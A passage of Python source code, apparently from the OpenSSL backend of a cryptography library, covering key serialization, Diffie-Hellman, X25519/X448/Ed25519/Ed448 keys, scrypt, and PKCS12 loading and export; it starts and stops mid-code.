self._lib.i2d_ECPrivateKey_bio\r\n                elif key_type == self._lib.EVP_PKEY_DSA:\r\n                    write_bio = self._lib.i2d_DSAPrivateKey_bio\r\n                else:\r\n                    raise ValueError(\r\n                        "Unsupported key type for TraditionalOpenSSL"\r\n                    )\r\n                return self._bio_func_output(write_bio, cdata)\r\n\r\n            raise ValueError("Unsupported encoding for TraditionalOpenSSL")\r\n\r\n        # OpenSSH + PEM\r\n        if format is serialization.PrivateFormat.OpenSSH:\r\n            if encoding is serialization.Encoding.PEM:\r\n                return ssh.serialize_ssh_private_key(key, password)\r\n\r\n            raise ValueError(\r\n                "OpenSSH private key format can only be used"\r\n                " with PEM encoding"\r\n            )\r\n\r\n        # Anything that key-specific code was supposed to handle earlier,\r\n        # like Raw.\r\n        raise ValueError("format is invalid with this key")\r\n\r\n    def _private_key_bytes_via_bio(self, write_bio, evp_pkey, password):\r\n        if not password:\r\n            evp_cipher = self._ffi.NULL\r\n        else:\r\n            # This is a curated value that we will update over time.\r\n            evp_cipher = self._lib.EVP_get_cipherbyname(b"aes-256-cbc")\r\n\r\n        return self._bio_func_output(\r\n            write_bio,\r\n            evp_pkey,\r\n            evp_cipher,\r\n            password,\r\n            len(password),\r\n            self._ffi.NULL,\r\n            self._ffi.NULL,\r\n        )\r\n\r\n    def _bio_func_output(self, write_bio, *args):\r\n        bio = self._create_mem_bio_gc()\r\n        res = write_bio(bio, *args)\r\n        self.openssl_assert(res == 1)\r\n        return self._read_mem_bio(bio)\r\n\r\n    def _public_key_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n        key,\r\n        evp_pkey,\r\n        cdata,\r\n    ) -> bytes:\r\n        if not isinstance(encoding, serialization.Encoding):\r\n            raise TypeError("encoding must be an item from the Encoding enum")\r\n        if not isinstance(format, serialization.PublicFormat):\r\n            raise TypeError(\r\n                "format must be an item from the PublicFormat enum"\r\n            )\r\n\r\n        # SubjectPublicKeyInfo + PEM/DER\r\n        if format is serialization.PublicFormat.SubjectPublicKeyInfo:\r\n            if encoding is serialization.Encoding.PEM:\r\n                write_bio = self._lib.PEM_write_bio_PUBKEY\r\n            elif encoding is serialization.Encoding.DER:\r\n                write_bio = self._lib.i2d_PUBKEY_bio\r\n            else:\r\n                raise ValueError(\r\n                    "SubjectPublicKeyInfo works only with PEM or DER encoding"\r\n                )\r\n            return self._bio_func_output(write_bio, evp_pkey)\r\n\r\n        # PKCS1 + PEM/DER\r\n        if format is serialization.PublicFormat.PKCS1:\r\n            # Only RSA is supported here.\r\n            key_type = self._lib.EVP_PKEY_id(evp_pkey)\r\n            if key_type != self._lib.EVP_PKEY_RSA:\r\n                raise ValueError("PKCS1 format is supported only for RSA keys")\r\n\r\n            if encoding is serialization.Encoding.PEM:\r\n                write_bio = self._lib.PEM_write_bio_RSAPublicKey\r\n            elif encoding is serialization.Encoding.DER:\r\n                write_bio = self._lib.i2d_RSAPublicKey_bio\r\n            else:\r\n                raise ValueError("PKCS1 works only with PEM or DER encoding")\r\n            return self._bio_func_output(write_bio, cdata)\r\n\r\n        # OpenSSH + OpenSSH\r\n        if format is serialization.PublicFormat.OpenSSH:\r\n            if encoding is serialization.Encoding.OpenSSH:\r\n                return ssh.serialize_ssh_public_key(key)\r\n\r\n            raise ValueError(\r\n                "OpenSSH format must be used with OpenSSH encoding"\r\n            )\r\n\r\n        # Anything that key-specific code was supposed to handle earlier,\r\n        # like Raw, CompressedPoint, UncompressedPoint\r\n        raise ValueError("format is invalid with this key")\r\n\r\n    def dh_supported(self) -> bool:\r\n        return not self._lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n\r\n    def generate_dh_parameters(\r\n        self, generator: int, key_size: int\r\n    ) -> dh.DHParameters:\r\n        if key_size < dh._MIN_MODULUS_SIZE:\r\n            raise ValueError(\r\n                "DH key_size must be at least {} bits".format(\r\n                    dh._MIN_MODULUS_SIZE\r\n                )\r\n            )\r\n\r\n        if generator not in (2, 5):\r\n            raise ValueError("DH generator must be 2 or 5")\r\n\r\n        dh_param_cdata = self._lib.DH_new()\r\n        self.openssl_assert(dh_param_cdata != self._ffi.NULL)\r\n        dh_param_cdata = self._ffi.gc(dh_param_cdata, self._lib.DH_free)\r\n\r\n        res = self._lib.DH_generate_parameters_ex(\r\n            dh_param_cdata, key_size, generator, self._ffi.NULL\r\n        )\r\n        self.openssl_assert(res == 1)\r\n\r\n        return _DHParameters(self, dh_param_cdata)\r\n\r\n    def _dh_cdata_to_evp_pkey(self, dh_cdata):\r\n        evp_pkey = self._create_evp_pkey_gc()\r\n        res = self._lib.EVP_PKEY_set1_DH(evp_pkey, dh_cdata)\r\n        self.openssl_assert(res == 1)\r\n        return evp_pkey\r\n\r\n    def generate_dh_private_key(\r\n        self, parameters: dh.DHParameters\r\n    ) -> dh.DHPrivateKey:\r\n        dh_key_cdata = _dh_params_dup(\r\n            parameters._dh_cdata, self  # type: ignore[attr-defined]\r\n        )\r\n\r\n        res = self._lib.DH_generate_key(dh_key_cdata)\r\n        self.openssl_assert(res == 1)\r\n\r\n        evp_pkey = self._dh_cdata_to_evp_pkey(dh_key_cdata)\r\n\r\n        return _DHPrivateKey(self, dh_key_cdata, evp_pkey)\r\n\r\n    def generate_dh_private_key_and_parameters(\r\n        self, generator: int, key_size: int\r\n    ) -> dh.DHPrivateKey:\r\n        return self.generate_dh_private_key(\r\n            self.generate_dh_parameters(generator, key_size)\r\n        )\r\n\r\n    def load_dh_private_numbers(\r\n        self, numbers: dh.DHPrivateNumbers\r\n    ) -> dh.DHPrivateKey:\r\n        parameter_numbers = numbers.public_numbers.parameter_numbers\r\n\r\n        dh_cdata = self._lib.DH_new()\r\n        self.openssl_assert(dh_cdata != self._ffi.NULL)\r\n        dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n\r\n        p = self._int_to_bn(parameter_numbers.p)\r\n        g = self._int_to_bn(parameter_numbers.g)\r\n\r\n        if parameter_numbers.q is not None:\r\n            q = self._int_to_bn(parameter_numbers.q)\r\n        else:\r\n            q = self._ffi.NULL\r\n\r\n        pub_key = self._int_to_bn(numbers.public_numbers.y)\r\n        priv_key = self._int_to_bn(numbers.x)\r\n\r\n        res = self._lib.DH_set0_pqg(dh_cdata, p, q, g)\r\n        self.openssl_assert(res == 1)\r\n\r\n        res = self._lib.DH_set0_key(dh_cdata, pub_key, priv_key)\r\n        self.openssl_assert(res == 1)\r\n\r\n        codes = self._ffi.new("int[]", 1)\r\n        res = self._lib.Cryptography_DH_check(dh_cdata, codes)\r\n        self.openssl_assert(res == 1)\r\n\r\n        # DH_check will return DH_NOT_SUITABLE_GENERATOR if p % 24 does not\r\n        # equal 11 when the generator is 2 (a quadratic nonresidue).\r\n        # We want to ignore that error because p % 24 == 23 is also fine.\r\n        # Specifically, g is then a quadratic residue. Within the context of\r\n        # Diffie-Hellman this means it can only generate half the possible\r\n        # values. That sounds bad, but quadratic nonresidues leak a bit of\r\n        # the key to the attacker in exchange for having the full key space\r\n        # available. See: https://crypto.stackexchange.com/questions/12961\r\n        if codes[0] != 0 and not (\r\n            parameter_numbers.g == 2\r\n            and codes[0] ^ self._lib.DH_NOT_SUITABLE_GENERATOR == 0\r\n        ):\r\n            raise ValueError("DH private numbers did not pass safety checks.")\r\n\r\n        evp_pkey = self._dh_cdata_to_evp_pkey(dh_cdata)\r\n\r\n        return _DHPrivateKey(self, dh_cdata, evp_pkey)\r\n\r\n    def load_dh_public_numbers(\r\n        self, numbers: dh.DHPublicNumbers\r\n    ) -> dh.DHPublicKey:\r\n        dh_cdata = self._lib.DH_new()\r\n        self.openssl_assert(dh_cdata != self._ffi.NULL)\r\n        dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n\r\n        parameter_numbers = numbers.parameter_numbers\r\n\r\n        p = self._int_to_bn(parameter_numbers.p)\r\n        g = self._int_to_bn(parameter_numbers.g)\r\n\r\n        if parameter_numbers.q is not None:\r\n            q = self._int_to_bn(parameter_numbers.q)\r\n        else:\r\n            q = self._ffi.NULL\r\n\r\n        pub_key = self._int_to_bn(numbers.y)\r\n\r\n        res = self._lib.DH_set0_pqg(dh_cdata, p, q, g)\r\n        self.openssl_assert(res == 1)\r\n\r\n        res = self._lib.DH_set0_key(dh_cdata, pub_key, self._ffi.NULL)\r\n        self.openssl_assert(res == 1)\r\n\r\n        evp_pkey = self._dh_cdata_to_evp_pkey(dh_cdata)\r\n\r\n        return _DHPublicKey(self, dh_cdata, evp_pkey)\r\n\r\n    def load_dh_parameter_numbers(\r\n        self, numbers: dh.DHParameterNumbers\r\n    ) -> dh.DHParameters:\r\n        dh_cdata = self._lib.DH_new()\r\n        self.openssl_assert(dh_cdata != self._ffi.NULL)\r\n        dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n\r\n        p = self._int_to_bn(numbers.p)\r\n        g = self._int_to_bn(numbers.g)\r\n\r\n        if numbers.q is not None:\r\n            q = self._int_to_bn(numbers.q)\r\n        else:\r\n            q = self._ffi.NULL\r\n\r\n        res = self._lib.DH_set0_pqg(dh_cdata, p, q, g)\r\n        self.openssl_assert(res == 1)\r\n\r\n        return _DHParameters(self, dh_cdata)\r\n\r\n    def dh_parameters_supported(\r\n        self, p: int, g: int, q: typing.Optional[int] = None\r\n    ) -> bool:\r\n        dh_cdata = self._lib.DH_new()\r\n        self.openssl_assert(dh_cdata != self._ffi.NULL)\r\n        dh_cdata = self._ffi.gc(dh_cdata, self._lib.DH_free)\r\n\r\n        p = self._int_to_bn(p)\r\n        g = self._int_to_bn(g)\r\n\r\n        if q is not None:\r\n            q = self._int_to_bn(q)\r\n        else:\r\n            q = self._ffi.NULL\r\n\r\n        res = self._lib.DH_set0_pqg(dh_cdata, p, q, g)\r\n        self.openssl_assert(res == 1)\r\n\r\n        codes = self._ffi.new("int[]", 1)\r\n        res = self._lib.Cryptography_DH_check(dh_cdata, codes)\r\n        self.openssl_assert(res == 1)\r\n\r\n        return codes[0] == 0\r\n\r\n    def dh_x942_serialization_supported(self) -> bool:\r\n        return self._lib.Cryptography_HAS_EVP_PKEY_DHX == 1\r\n\r\n    def x25519_load_public_bytes(self, data: bytes) -> x25519.X25519PublicKey:\r\n        # When we drop support for CRYPTOGRAPHY_OPENSSL_LESS_THAN_111 we can\r\n        # switch this to EVP_PKEY_new_raw_public_key\r\n        if len(data) != 32:\r\n            raise ValueError("An X25519 public key is 32 bytes long")\r\n\r\n        evp_pkey = self._create_evp_pkey_gc()\r\n        res = self._lib.EVP_PKEY_set_type(evp_pkey, self._lib.NID_X25519)\r\n        self.openssl_assert(res == 1)\r\n        res = self._lib.EVP_PKEY_set1_tls_encodedpoint(\r\n            evp_pkey, data, len(data)\r\n        )\r\n        self.openssl_assert(res == 1)\r\n        return _X25519PublicKey(self, evp_pkey)\r\n\r\n    def x25519_load_private_bytes(\r\n        self, data: bytes\r\n    ) -> x25519.X25519PrivateKey:\r\n        # When we drop support for CRYPTOGRAPHY_OPENSSL_LESS_THAN_111 we can\r\n        # switch this to EVP_PKEY_new_raw_private_key and drop the\r\n        # zeroed_bytearray garbage.\r\n        # OpenSSL only has facilities for loading PKCS8 formatted private\r\n        # keys using the algorithm identifiers specified in\r\n        # https://tools.ietf.org/html/draft-ietf-curdle-pkix-09.\r\n        # This is the standard PKCS8 prefix for a 32 byte X25519 key.\r\n        # The form is:\r\n        #    0:d=0  hl=2 l=  46 cons: SEQUENCE\r\n        #    2:d=1  hl=2 l=   1 prim: INTEGER           :00\r\n        #    5:d=1  hl=2 l=   5 cons: SEQUENCE\r\n        #    7:d=2  hl=2 l=   3 prim: OBJECT            :1.3.101.110\r\n        #    12:d=1  hl=2 l=  34 prim: OCTET STRING      (the key)\r\n        # Of course there\'s a bit more complexity. In reality OCTET STRING\r\n        # contains an OCTET STRING of length 32! So the last two bytes here\r\n        # are \\x04\\x20, which is an OCTET STRING of length 32.\r\n        if len(data) != 32:\r\n            raise ValueError("An X25519 private key is 32 bytes long")\r\n\r\n        pkcs8_prefix = b\'0.\\x02\\x01\\x000\\x05\\x06\\x03+en\\x04"\\x04 \'\r\n        with self._zeroed_bytearray(48) as ba:\r\n            ba[0:16] = pkcs8_prefix\r\n            ba[16:] = data\r\n            bio = self._bytes_to_bio(ba)\r\n            evp_pkey = self._lib.d2i_PrivateKey_bio(bio.bio, self._ffi.NULL)\r\n\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n        self.openssl_assert(\r\n            self._lib.EVP_PKEY_id(evp_pkey) == self._lib.EVP_PKEY_X25519\r\n        )\r\n        return _X25519PrivateKey(self, evp_pkey)\r\n\r\n    def _evp_pkey_keygen_gc(self, nid):\r\n        evp_pkey_ctx = self._lib.EVP_PKEY_CTX_new_id(nid, self._ffi.NULL)\r\n        self.openssl_assert(evp_pkey_ctx != self._ffi.NULL)\r\n        evp_pkey_ctx = self._ffi.gc(evp_pkey_ctx, self._lib.EVP_PKEY_CTX_free)\r\n        res = self._lib.EVP_PKEY_keygen_init(evp_pkey_ctx)\r\n        self.openssl_assert(res == 1)\r\n        evp_ppkey = self._ffi.new("EVP_PKEY **")\r\n        res = self._lib.EVP_PKEY_keygen(evp_pkey_ctx, evp_ppkey)\r\n        self.openssl_assert(res == 1)\r\n        self.openssl_assert(evp_ppkey[0] != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_ppkey[0], self._lib.EVP_PKEY_free)\r\n        return evp_pkey\r\n\r\n    def x25519_generate_key(self) -> x25519.X25519PrivateKey:\r\n        evp_pkey = self._evp_pkey_keygen_gc(self._lib.NID_X25519)\r\n        return _X25519PrivateKey(self, evp_pkey)\r\n\r\n    def x25519_supported(self) -> bool:\r\n        if self._fips_enabled:\r\n            return False\r\n        return not self._lib.CRYPTOGRAPHY_IS_LIBRESSL\r\n\r\n    def x448_load_public_bytes(self, data: bytes) -> x448.X448PublicKey:\r\n        if len(data) != 56:\r\n            raise ValueError("An X448 public key is 56 bytes long")\r\n\r\n        evp_pkey = self._lib.EVP_PKEY_new_raw_public_key(\r\n            self._lib.NID_X448, self._ffi.NULL, data, len(data)\r\n        )\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n        return _X448PublicKey(self, evp_pkey)\r\n\r\n    def x448_load_private_bytes(self, data: bytes) -> x448.X448PrivateKey:\r\n        if len(data) != 56:\r\n            raise ValueError("An X448 private key is 56 bytes long")\r\n\r\n        data_ptr = self._ffi.from_buffer(data)\r\n        evp_pkey = self._lib.EVP_PKEY_new_raw_private_key(\r\n            self._lib.NID_X448, self._ffi.NULL, data_ptr, len(data)\r\n        )\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n        return _X448PrivateKey(self, evp_pkey)\r\n\r\n    def x448_generate_key(self) -> x448.X448PrivateKey:\r\n        evp_pkey = self._evp_pkey_keygen_gc(self._lib.NID_X448)\r\n        return _X448PrivateKey(self, evp_pkey)\r\n\r\n    def x448_supported(self) -> bool:\r\n        if self._fips_enabled:\r\n            return False\r\n        return (\r\n            not self._lib.CRYPTOGRAPHY_OPENSSL_LESS_THAN_111\r\n            and not self._lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n        )\r\n\r\n    def ed25519_supported(self) -> bool:\r\n        if self._fips_enabled:\r\n            return False\r\n        return not self._lib.CRYPTOGRAPHY_OPENSSL_LESS_THAN_111B\r\n\r\n    def ed25519_load_public_bytes(\r\n        self, data: bytes\r\n    ) -> ed25519.Ed25519PublicKey:\r\n        utils._check_bytes("data", data)\r\n\r\n        if len(data) != ed25519._ED25519_KEY_SIZE:\r\n            raise ValueError("An Ed25519 public key is 32 bytes long")\r\n\r\n        evp_pkey = self._lib.EVP_PKEY_new_raw_public_key(\r\n            self._lib.NID_ED25519, self._ffi.NULL, data, len(data)\r\n        )\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n\r\n        return _Ed25519PublicKey(self, evp_pkey)\r\n\r\n    def ed25519_load_private_bytes(\r\n        self, data: bytes\r\n    ) -> ed25519.Ed25519PrivateKey:\r\n        if len(data) != ed25519._ED25519_KEY_SIZE:\r\n            raise ValueError("An Ed25519 private key is 32 bytes long")\r\n\r\n        utils._check_byteslike("data", data)\r\n        data_ptr = self._ffi.from_buffer(data)\r\n        evp_pkey = self._lib.EVP_PKEY_new_raw_private_key(\r\n            self._lib.NID_ED25519, self._ffi.NULL, data_ptr, len(data)\r\n        )\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n\r\n        return _Ed25519PrivateKey(self, evp_pkey)\r\n\r\n    def ed25519_generate_key(self) -> ed25519.Ed25519PrivateKey:\r\n        evp_pkey = self._evp_pkey_keygen_gc(self._lib.NID_ED25519)\r\n        return _Ed25519PrivateKey(self, evp_pkey)\r\n\r\n    def ed448_supported(self) -> bool:\r\n        if self._fips_enabled:\r\n            return False\r\n        return (\r\n            not self._lib.CRYPTOGRAPHY_OPENSSL_LESS_THAN_111B\r\n            and not self._lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n        )\r\n\r\n    def ed448_load_public_bytes(self, data: bytes) -> ed448.Ed448PublicKey:\r\n        utils._check_bytes("data", data)\r\n        if len(data) != _ED448_KEY_SIZE:\r\n            raise ValueError("An Ed448 public key is 57 bytes long")\r\n\r\n        evp_pkey = self._lib.EVP_PKEY_new_raw_public_key(\r\n            self._lib.NID_ED448, self._ffi.NULL, data, len(data)\r\n        )\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n\r\n        return _Ed448PublicKey(self, evp_pkey)\r\n\r\n    def ed448_load_private_bytes(self, data: bytes) -> ed448.Ed448PrivateKey:\r\n        utils._check_byteslike("data", data)\r\n        if len(data) != _ED448_KEY_SIZE:\r\n            raise ValueError("An Ed448 private key is 57 bytes long")\r\n\r\n        data_ptr = self._ffi.from_buffer(data)\r\n        evp_pkey = self._lib.EVP_PKEY_new_raw_private_key(\r\n            self._lib.NID_ED448, self._ffi.NULL, data_ptr, len(data)\r\n        )\r\n        self.openssl_assert(evp_pkey != self._ffi.NULL)\r\n        evp_pkey = self._ffi.gc(evp_pkey, self._lib.EVP_PKEY_free)\r\n\r\n        return _Ed448PrivateKey(self, evp_pkey)\r\n\r\n    def ed448_generate_key(self) -> ed448.Ed448PrivateKey:\r\n        evp_pkey = self._evp_pkey_keygen_gc(self._lib.NID_ED448)\r\n        return _Ed448PrivateKey(self, evp_pkey)\r\n\r\n    def derive_scrypt(\r\n        self,\r\n        key_material: bytes,\r\n        salt: bytes,\r\n        length: int,\r\n        n: int,\r\n        r: int,\r\n        p: int,\r\n    ) -> bytes:\r\n        buf = self._ffi.new("unsigned char[]", length)\r\n        key_material_ptr = self._ffi.from_buffer(key_material)\r\n        res = self._lib.EVP_PBE_scrypt(\r\n            key_material_ptr,\r\n            len(key_material),\r\n            salt,\r\n            len(salt),\r\n            n,\r\n            r,\r\n            p,\r\n            scrypt._MEM_LIMIT,\r\n            buf,\r\n            length,\r\n        )\r\n        if res != 1:\r\n            errors = self._consume_errors_with_text()\r\n            # memory required formula explained here:\r\n            # https://blog.filippo.io/the-scrypt-parameters/\r\n            min_memory = 128 * n * r // (1024**2)\r\n            raise MemoryError(\r\n                "Not enough memory to derive key. These parameters require"\r\n                " {} MB of memory.".format(min_memory),\r\n                errors,\r\n            )\r\n        return self._ffi.buffer(buf)[:]\r\n\r\n    def aead_cipher_supported(self, cipher) -> bool:\r\n        cipher_name = aead._aead_cipher_name(cipher)\r\n        if self._fips_enabled and cipher_name not in self._fips_aead:\r\n            return False\r\n        # SIV isn\'t loaded through get_cipherbyname but instead a new fetch API\r\n        # only available in 3.0+. But if we know we\'re on 3.0+ then we know\r\n        # it\'s supported.\r\n        if cipher_name.endswith(b"-siv"):\r\n            return self._lib.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER == 1\r\n        else:\r\n            return (\r\n                self._lib.EVP_get_cipherbyname(cipher_name) != self._ffi.NULL\r\n            )\r\n\r\n    @contextlib.contextmanager\r\n    def _zeroed_bytearray(self, length: int) -> typing.Iterator[bytearray]:\r\n        """\r\n        This method creates a bytearray, which we copy data into (hopefully\r\n        also from a mutable buffer that can be dynamically erased!), and then\r\n        zero when we\'re done.\r\n        """\r\n        ba = bytearray(length)\r\n        try:\r\n            yield ba\r\n        finally:\r\n            self._zero_data(ba, length)\r\n\r\n    def _zero_data(self, data, length: int) -> None:\r\n        # We clear things this way because at the moment we\'re not\r\n        # sure of a better way that can guarantee it overwrites the\r\n        # memory of a bytearray and doesn\'t just replace the underlying char *.\r\n        for i in range(length):\r\n            data[i] = 0\r\n\r\n    @contextlib.contextmanager\r\n    def _zeroed_null_terminated_buf(self, data):\r\n        """\r\n        This method takes bytes, which can be a bytestring or a mutable\r\n        buffer like a bytearray, and yields a null-terminated version of that\r\n        data. This is required because PKCS12_parse doesn\'t take a length with\r\n        its password char * and ffi.from_buffer doesn\'t provide null\r\n        termination. So, to support zeroing the data via bytearray we\r\n        need to build this ridiculous construct that copies the memory, but\r\n        zeroes it after use.\r\n        """\r\n        if data is None:\r\n            yield self._ffi.NULL\r\n        else:\r\n            data_len = len(data)\r\n            buf = self._ffi.new("char[]", data_len + 1)\r\n            self._ffi.memmove(buf, data, data_len)\r\n            try:\r\n                yield buf\r\n            finally:\r\n                # Cast to a uint8_t * so we can assign by integer\r\n                self._zero_data(self._ffi.cast("uint8_t *", buf), data_len)\r\n\r\n    def load_key_and_certificates_from_pkcs12(\r\n        self, data: bytes, password: typing.Optional[bytes]\r\n    ) -> typing.Tuple[\r\n        typing.Optional[PRIVATE_KEY_TYPES],\r\n        typing.Optional[x509.Certificate],\r\n        typing.List[x509.Certificate],\r\n    ]:\r\n        pkcs12 = self.load_pkcs12(data, password)\r\n        return (\r\n            pkcs12.key,\r\n            pkcs12.cert.certificate if pkcs12.cert else None,\r\n            [cert.certificate for cert in pkcs12.additional_certs],\r\n        )\r\n\r\n    def load_pkcs12(\r\n        self, data: bytes, password: typing.Optional[bytes]\r\n    ) -> PKCS12KeyAndCertificates:\r\n        if password is not None:\r\n            utils._check_byteslike("password", password)\r\n\r\n        bio = self._bytes_to_bio(data)\r\n        p12 = self._lib.d2i_PKCS12_bio(bio.bio, self._ffi.NULL)\r\n        if p12 == self._ffi.NULL:\r\n            self._consume_errors()\r\n            raise ValueError("Could not deserialize PKCS12 data")\r\n\r\n        p12 = self._ffi.gc(p12, self._lib.PKCS12_free)\r\n        evp_pkey_ptr = self._ffi.new("EVP_PKEY **")\r\n        x509_ptr = self._ffi.new("X509 **")\r\n        sk_x509_ptr = self._ffi.new("Cryptography_STACK_OF_X509 **")\r\n        with self._zeroed_null_terminated_buf(password) as password_buf:\r\n            res = self._lib.PKCS12_parse(\r\n                p12, password_buf, evp_pkey_ptr, x509_ptr, sk_x509_ptr\r\n            )\r\n\r\n        # Workaround for\r\n        # https://github.com/libressl-portable/portable/issues/659\r\n        if self._lib.CRYPTOGRAPHY_LIBRESSL_LESS_THAN_340:\r\n            self._consume_errors()\r\n\r\n        if res == 0:\r\n            self._consume_errors()\r\n            raise ValueError("Invalid password or PKCS12 data")\r\n\r\n        cert = None\r\n        key = None\r\n        additional_certificates = []\r\n\r\n        if evp_pkey_ptr[0] != self._ffi.NULL:\r\n            evp_pkey = self._ffi.gc(evp_pkey_ptr[0], self._lib.EVP_PKEY_free)\r\n            key = self._evp_pkey_to_private_key(evp_pkey)\r\n\r\n        if x509_ptr[0] != self._ffi.NULL:\r\n            x509 = self._ffi.gc(x509_ptr[0], self._lib.X509_free)\r\n            cert_obj = self._ossl2cert(x509)\r\n            name = None\r\n            maybe_name = self._lib.X509_alias_get0(x509, self._ffi.NULL)\r\n            if maybe_name != self._ffi.NULL:\r\n                name = self._ffi.string(maybe_name)\r\n            cert = PKCS12Certificate(cert_obj, name)\r\n\r\n        if sk_x509_ptr[0] != self._ffi.NULL:\r\n            sk_x509 = self._ffi.gc(sk_x509_ptr[0], self._lib.sk_X509_free)\r\n            num = self._lib.sk_X509_num(sk_x509_ptr[0])\r\n\r\n            # In OpenSSL < 3.0.0 PKCS12 parsing reverses the order of the\r\n            # certificates.\r\n            indices: typing.Iterable[int]\r\n            if (\r\n                self._lib.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER\r\n                or self._lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n            ):\r\n                indices = range(num)\r\n            else:\r\n                indices = reversed(range(num))\r\n\r\n            for i in indices:\r\n                x509 = self._lib.sk_X509_value(sk_x509, i)\r\n                self.openssl_assert(x509 != self._ffi.NULL)\r\n                x509 = self._ffi.gc(x509, self._lib.X509_free)\r\n                addl_cert = self._ossl2cert(x509)\r\n                addl_name = None\r\n                maybe_name = self._lib.X509_alias_get0(x509, self._ffi.NULL)\r\n                if maybe_name != self._ffi.NULL:\r\n                    addl_name = self._ffi.string(maybe_name)\r\n                additional_certificates.append(\r\n                    PKCS12Certificate(addl_cert, addl_name)\r\n                )\r\n\r\n        return PKCS12KeyAndCertificates(key, cert, additional_certificates)\r\n\r\n    def serialize_key_and_certificates_to_pkcs12(\r\n        self,\r\n        name: typing.Optional[bytes],\r\n        key: typing.Optional[_ALLOWED_PKCS12_TYPES],\r\n        cert: typing.Optional[x509.Certificate],\r\n        cas: typing.Optional[typing.List[_PKCS12_CAS_TYPES]],\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        password = None\r\n        if name is not None:\r\n            utils._check_bytes("name", name)\r\n\r\n        if isinstance(encryption_algorithm, serialization.NoEncryption):\r\n            nid_cert = -1\r\n            nid_key = -1\r\n            pkcs12_iter = 0\r\n            mac_iter = 0\r\n        elif isinstance(\r\n            encryption_algorithm, serialization.BestAvailableEncryption\r\n        ):\r\n            # PKCS12 encryption is hopeless trash and can never be fixed.\r\n            # This is the least terrible option.\r\n            nid_cert = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\r\n            nid_key = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\r\n            # At least we can set this higher than OpenSSL\'s default\r\n            pkcs12_iter = 20000\r\n            # mac_iter chosen for compatibility reasons, see:\r\n            # https://www.openssl.org/docs/man1.1.1/man3/PKCS12_create.html\r\n            # Did we mention how lousy PKCS12 encryption is?\r\n            mac_iter = 1\r\n            password = encryption_algorithm.password\r\n        else:\r\n            raise ValueError("Unsupported key encryption type")\r\n\r\n        if cas is None or len(cas) == 0:\r\n            sk_x509 = self._ffi.NULL\r\n        else:\r\n            sk_x509 = self._lib.sk_X509_new_null()\r\n            sk_x509 = self._ffi.gc(sk_x509, self._lib.sk_X509_free)\r\n\r\n            # This list is to keep the x509 values alive until end of function\r\n            ossl_cas = []\r\n            for ca in cas:\r\n                if isinstance(ca, PKCS12Certificate):\r\n                    ca_alias = ca.friendly_name\r\n                    ossl_ca = self._cert2ossl(ca.certificate)\r\n                    with self._zeroed_null_terminated_buf(\r\n                        ca_alias\r\n                    ) as ca_name_buf:\r\n                        res = self._lib.X509_alias_set1(\r\n                            ossl_ca, ca_name_buf, -1\r\n                        )\r\n                        self.openssl_assert(res == 1)\r\n                else:\r\n                    ossl_ca = self._cert2ossl(ca)\r\n                ossl_cas.append(ossl_ca)\r\n                res = self._lib.sk_X509_push(sk_x509, ossl_ca)\r\n                backend.openssl_assert(res >= 1)\r\n\r\n        with self._zeroed_null_terminated_buf(password) as password_buf:\r\n            with self._zeroed_null_terminated_buf(name) as name_buf:\r\n                ossl_cert = self._cert2ossl(cert) if cert else self._ffi.NULL\r\n                if key is not None:\r\n                    evp_pkey = key._evp_pkey  # type: ignore[union-attr]\r\n                else:\r\n                    evp_pkey = self._ffi.NULL\r\n\r\n                p12 = self._lib.PKCS12_create(\r\n                    password_buf,\r\n                    name_buf,\r\n                    evp_pkey,\r\n                    ossl_cert,\r\n                    sk_x509,\r\n                    nid_key,\r\n                    nid_cert,\r\n                    pkcs12_iter,\r\n                    mac_iter,\r\n                    0,\r\n                )\r\n\r\n        self.openssl_assert(p12 != self._ffi.NULL)\r\n        p12 = self._ffi.gc(p12, self._lib.PKCS12_free)\r\n\r\n        bio = self._create_mem_bio_gc()\r\n        res = self._lib.i2d_PKCS12_bio(bio, p12)\r\n        self.openssl_assert(res > 0)\r\n        return self._read_mem_bio(bio)\r\n\r\n    def poly1305_supported(self) -> bool:\r\n        if self._fips_enabled:\r\n            return False\r\n        return self._lib.Cryptography_HAS_POLY1305 == 1\r\n\r\n    def create_poly1305_ctx(self, key: bytes) -> _Poly1305Context:\r\n        utils._check_byteslike("key", key)\r\n        if len(key) != _POLY1305_KEY_SIZE:\r\n            raise ValueError("A poly1305 key is 32 bytes long")\r\n\r\n        return _Poly1305Context(self, key)\r\n\r\n    def pkcs7_supported(self) -> bool:\r\n        return not self._lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n\r\n    def load_pem_pkcs7_certificates(\r\n        self, data: bytes\r\n    ) -> typing.List[x509.Certificate]:\r\n        utils._check_bytes("data", data)\r\n        bio = self._bytes_to_bio(data)\r\n        p7 = self._lib.PEM_read_bio_PKCS7(\r\n            bio.bio, self._ffi.NULL, self._ffi.NULL, self._ffi.NULL\r\n        )\r\n        if p7 == 